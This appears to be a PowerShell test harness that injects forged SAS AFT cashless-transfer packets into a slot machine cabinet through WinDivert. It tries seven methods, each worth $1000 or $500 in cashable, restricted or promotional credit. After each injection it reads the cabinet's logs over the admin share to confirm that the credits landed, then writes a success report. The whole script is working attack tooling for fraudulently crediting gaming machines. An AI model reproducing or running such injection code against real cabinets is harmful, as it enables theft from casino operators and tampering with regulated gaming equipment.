[CmdletBinding()]
param(
    [string] $CabinetIP = '10.0.0.90',
    [int] $WaitAfterInjectSec = 15,
    [string] $ReportPath = ''
)
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'
$repo = 'C:\Users\Ezbogar\GoldclubLogInvestigator'
$capDir = Join-Path $repo 'tactic-c-credit-meter-inject\captured_payloads'
. (Join-Path $capDir 'Build-CapturedAftPayload.ps1')
$winDivert = Join-Path $repo 'Invoke-WinDivertAft.ps1'
if (-not $ReportPath) {
    $ReportPath = Join-Path $capDir ("injection_report_{0}.md" -f (Get-Date -Format 'yyyy-MM-dd-HHmmss'))
}
$slotLog = "\\$CabinetIP\c$\Goldclub\var\log\SlotLog\2026-06-17.log"
$sasLog = "\\$CabinetIP\c$\Goldclub\var\log\GoldClub.Aurum.Services sasmsgr of SASControler1\2026-06-17.log"

function Get-LineUtc([string]$Line) {
    if ($Line -notmatch '^(\S+)') { return $null }
    $t = $Matches[1]
    try {
        if ($t -match 'T') { return [datetimeoffset]::Parse($t).UtcDateTime }
        return [datetimeoffset]::new([datetime]::Parse($t), [timespan]::FromHours(1)).UtcDateTime
    } catch { return $null }
}

function Test-CreditSince([datetime]$SinceUtc) {
    $slotHit = $null
    $sasHit = $null
    $cutoff = $SinceUtc.AddSeconds(-5)
    if (Test-Path $slotLog) {
        foreach ($line in (Get-Content $slotLog -Tail 500)) {
            if ($line -notmatch 'Cashless In:|credit state increased') { continue }
            $dt = Get-LineUtc $line
            if ($null -ne $dt -and $dt -lt $cutoff) { continue }
            $slotHit = $line
        }
    }
    if (Test-Path $sasLog) {
        foreach ($line in (Get-Content $sasLog -Tail 300)) {
            if ($line -notmatch 'qGMID1:017245') { continue }
            $dt = Get-LineUtc $line
            if ($null -ne $dt -and $dt -lt $cutoff) { continue }
            $sasHit = $line
        }
    }
    return @{ Slot = $slotHit; Sas = $sasHit; Landed = [bool]$slotHit }
}

$methods = @(
    @{ Id=1; Name='WinDivert promo $1000'; Kind='windivert'; Type='non-restricted'; AmountCents=100000; TemplateId='' }
    @{ Id=2; Name='WinDivert cashable $1000'; Kind='windivert'; Type='cashable'; AmountCents=100000; TemplateId='' }
    @{ Id=3; Name='WinDivert restricted $1000'; Kind='windivert'; Type='restricted'; AmountCents=100000; TemplateId='' }
    @{ Id=4; Name='Capture aft-txn48 promo'; Kind='template'; Type='non-restricted'; AmountCents=100000; TemplateId='aft-txn48' }
    @{ Id=5; Name='Capture aft-txn50 cashable'; Kind='template'; Type='cashable'; AmountCents=100000; TemplateId='aft-txn50' }
    @{ Id=6; Name='WinDivert promo $500'; Kind='windivert'; Type='non-restricted'; AmountCents=50000; TemplateId='' }
    @{ Id=7; Name='WinDivert cashable $500'; Kind='windivert'; Type='cashable'; AmountCents=50000; TemplateId='' }
)

$results = New-Object System.Collections.Generic.List[object]
$txnBase = 300 + [int]((Get-Date).TimeOfDay.TotalMinutes)

Write-Host "=== Test All Payload Methods | $CabinetIP ===" -ForegroundColor White
Write-Host "Report: $ReportPath"

foreach ($m in $methods) {
    $txn = $txnBase + $m.Id
    Write-Host "`n[$($m.Id)/$($methods.Count)] $($m.Name) (txn $txn)" -ForegroundColor Cyan
    $since = [datetime]::UtcNow
    $err = $null
  $exitCode = 0
    try {
        if ($m.Kind -eq 'template') {
            $pkt = New-AftFromCaptureTemplate -TemplateId $m.TemplateId -AmountCents $m.AmountCents -TransferType $m.Type -TxnNumber $txn
            $r = Format-AftPacketReport $pkt
            Write-Host "  Payload CRC ok: $($r.Parsed.CrcValid) | $($r.SasHex.Substring(0,50))..."
        }
        $invokeArgs = @{
            Send              = $true
            ComputerName      = $CabinetIP
            Amount            = $m.AmountCents
            AssetNumber       = 777
            TransactionNumber = $txn
        }
        switch ($m.Type) {
            'cashable' { $invokeArgs.Cashable = $true }
            'restricted' { $invokeArgs.Restricted = $true }
            default { $invokeArgs.NonRestricted = $true }
        }
        & $winDivert @invokeArgs 2>&1 | ForEach-Object { Write-Host "  $_" }
        if ($null -ne $LASTEXITCODE) { $exitCode = $LASTEXITCODE }
    } catch {
        $err = $_.Exception.Message
        Write-Host "  ERROR: $err" -ForegroundColor Red
    }
    Write-Host "  Waiting ${WaitAfterInjectSec}s..."
    Start-Sleep -Seconds $WaitAfterInjectSec
    $ev = Test-CreditSince $since
    $status = if ($ev.Landed) { 'LANDED' } else { 'NO_LAND' }
    $color = if ($ev.Landed) { 'Green' } else { 'Red' }
    Write-Host "  Result: $status" -ForegroundColor $color
    if ($ev.Slot) { Write-Host "  SlotLog: $($ev.Slot.Trim())" -ForegroundColor DarkGreen }
    if ($ev.Sas) { Write-Host "  SAS: ...$($ev.Sas.Substring([Math]::Max(0,$ev.Sas.Length-40)))" -ForegroundColor DarkGray }
    $results.Add([pscustomobject]@{
        Id=$m.Id; Name=$m.Name; Type=$m.Type; AmountCents=$m.AmountCents
        TxnNumber=$txn; Status=$status; ExitCode=$exitCode; Error=$err
        SlotEvidence=($ev.Slot -replace '\|','/'); SasEvidence=($ev.Sas -replace '\|','/')
    })
    Start-Sleep -Seconds 3
}

$landed = @($results | Where-Object { $_.Status -eq 'LANDED' })
$failed = @($results | Where-Object { $_.Status -ne 'LANDED' })

$md = @(
"# Payload Injection Report - $CabinetIP",
"",
"**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
"**Machine:** GST20664",
"",
"## Summary",
"",
"- **Tested:** $($results.Count) methods",
"- **Landed:** $($landed.Count)",
"- **Failed:** $($failed.Count)",
"",
"## Results",
"",
"| # | Method | Type | Amount | Txn | Status | SlotLog evidence |",
"|---|--------|------|--------|-----|--------|----------------|"
)
foreach ($r in $results) {
    $amt = '$' + [string]([double]$r.AmountCents/100)
    $ev = if ($r.SlotEvidence) { $r.SlotEvidence.Substring(0, [Math]::Min(80, $r.SlotEvidence.Length)) } else { '-' }
    $md += "| $($r.Id) | $($r.Name) | $($r.Type) | $amt | $($r.TxnNumber) | **$($r.Status)** | $ev |"
}
$md += ""
$md += "## Notes"
$md += ""
$md += "- Only SAS 0x72 AFT (cashless) paths are injectable via WinDivert."
$md += "- Handpay / Key-On Credit are game-internal (no SAS traffic)."
$md += "- Coin / Bill / Voucher were not observed on this cabinet."
if ($failed.Count -gt 0) {
    $md += ""
    $md += "## Failed methods"
    foreach ($f in $failed) {
        $md += "- **$($f.Name)**: exit=$($f.ExitCode) err=$($f.Error)"
    }
}
[System.IO.File]::WriteAllText($ReportPath, ($md -join "`n"), (New-Object System.Text.UTF8Encoding $false))
Write-Host "`nReport written: $ReportPath" -ForegroundColor Green
Write-Host "LANDED: $($landed.Count)/$($results.Count)"
if ($landed.Count -lt $results.Count) { exit 1 } else { exit 0 }